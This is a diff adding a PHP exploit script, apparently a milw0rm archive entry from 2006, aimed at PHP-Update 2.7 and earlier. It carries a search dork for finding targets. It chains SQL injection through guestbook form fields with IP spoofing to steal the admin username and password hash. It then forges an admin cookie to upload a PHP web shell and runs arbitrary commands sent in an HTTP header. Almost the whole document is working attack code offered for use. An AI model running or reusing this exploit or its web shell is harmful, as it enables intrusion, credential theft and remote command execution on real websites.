@@ -1,0 +1,274 @@
+<?php
+print_r('
+---------------------------------------------------------------------------
+PHP-Update <= 2.7 str_replace() sql injection / privilege escalation /
+/ cmd exec ii
+by rgod
+dork: "Powered by PHP-Update" -site:www.php-update.co.uk -ihackstuff
+      -exploit
+
+mail: retrog at alice dot it
+site: http://retrogod.altervista.org
+---------------------------------------------------------------------------
+');
+/*
+this works regardless of php.ini settings
+and against the Php-Update mysql version with Mysql >= 4.1
+(allowing subs)
+*/
+
+if ($argc<3) {
+    print_r('
+---------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to PHPUpdate
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+ -t[prefix]:  specify a table prefix
+Example:
+php '.$argv[0].' localhost /phpupd/ ls -la -P1.1.1.1:80
+php '.$argv[0].' localhost / ls -la -p81
+php '.$argv[0].' localhost / ls -la -tphpupd_
+---------------------------------------------------------------------------
+');
+    die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+$cmd="";
+$prefix="phpusql_";
+
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p")
+and ($temp<>"-P")
+and ($temp<>"-t")
+) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+if ($temp=="-t")
+{
+  $prefix=str_replace("-t","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+function my_encode($my_string)
+{
+  $encoded="CHAR(";
+  for ($k=0; $k<=strlen($my_string)-1; $k++)
+  {
+    $encoded.=ord($my_string[$k]);
+    if ($k==strlen($my_string)-1) {$encoded.=")";}
+    else {$encoded.=",";}
+  }
+  return $encoded;
+}
+/*
+because of the bad use of extract() we can pass arguments
+calling directly the /code/guestadd.php script
+we have sql injections in multiple arguments, "newmessage",
+"newname","newwebsite","newemail"
+and we can use quotes because we have:
+
+  [argument] = str_replace("\'","'",[argument]);
+
+on every ones
+oh, let me see our query...
+
+ INSERT INTO phpusql_guestbook VALUES('1', '[injection here]
+
+so...
+*/
+
+$UTAG=my_encode("<USER>");
+$PTAG=my_encode("<PASS>");
+$SQL ="1',(SELECT/**/CONCAT(".$UTAG.",username,".$UTAG.")/**/FROM/**/".$prefix."users/**/WHERE/**/ADMIN=1),";
+$SQL.="(SELECT/**/CONCAT(".$PTAG.",password,".$PTAG.")/**/FROM/**/".$prefix."users/**/WHERE ADMIN=1),'1','1.1.1.1','1')";
+$SQL.="/**/ON/**/DUPLICATE /**/KEY/**/UPDATE/**/autono=autono+1/*";
+
+//funny, isn't it? :) we hide password hashes inside guestbook html
+
+//also, I note this, we have a spoofing issue, beacuse of extract()
+//let's overwrite the ip address...
+$data='-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="_SERVER[REMOTE_ADDR]";
+
+1.1.1.1
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="newmessage";
+
+1
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="newname";
+
+'.$SQL.'
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="newwebsite";
+
+1
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="newemail";
+
+1
+-----------------------------7d61bcd1f033e--
+';
+$packet ="POST ".$p."code/guestadd.php HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+
+//so let's see the admin pair...
+$packet ="GET ".$p."index.php?s=guestbook HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("<USER>",$html);
+$user=$temp[1];
+$temp=explode("<PASS>",$html);
+$pwd=$temp[1];
+
+function is_my_hash($hash)
+{
+ if (ereg("([a-f0-9]{16})|([A-F0-9]{41})",trim($hash))) {return true;}
+ else {return false;}
+}
+
+if (is_my_hash($pwd)) {
+    print_r('
+admin -> '.$user.'
+MySql PASSWORD() hash -> '.$pwd.'
+admin cookie -> logincookie[user]='.$user.'; logincookie[pwd]='.$pwd.';
+');
+}
+else
+{  //die("exploit failed...");
+   //let's continue, maybe already executed...
+}
+sleep(1);
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+srand(make_seed());
+$v = rand(111111,999999);
+
+//with admin privileges, we upload a php file...
+$data='-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="userfile"; filename="suntzu_'.$v.'.php";
+Content-type: text/plain;
+
+<?php set_time_limit(0); error_reporting(7); echo "my_delim"; passthru($_SERVER[HTTP_SUNTZU]); echo "my_delim";?>
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="filecat";
+
+files
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="submit";
+
+Upload
+-----------------------------7d61bcd1f033e--
+';
+$packet ="POST ".$p."admin/uploads.php HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Cookie: logincookie[user]=".$user."; logincookie[pwd]=".$pwd.";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+
+//now launch commands...
+$packet ="GET ".$p."files/suntzu_".$v.".php HTTP/1.0\r\n";
+$packet.="SUNTZU: ".$cmd."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (eregi("my_delim",$html)) {
+    $temp=explode("my_delim",$html);
+    echo $temp[1];
+}
+else {
+    echo "exploit failed...";
+}
+?>
+
+# milw0rm.com [2006-12-26]
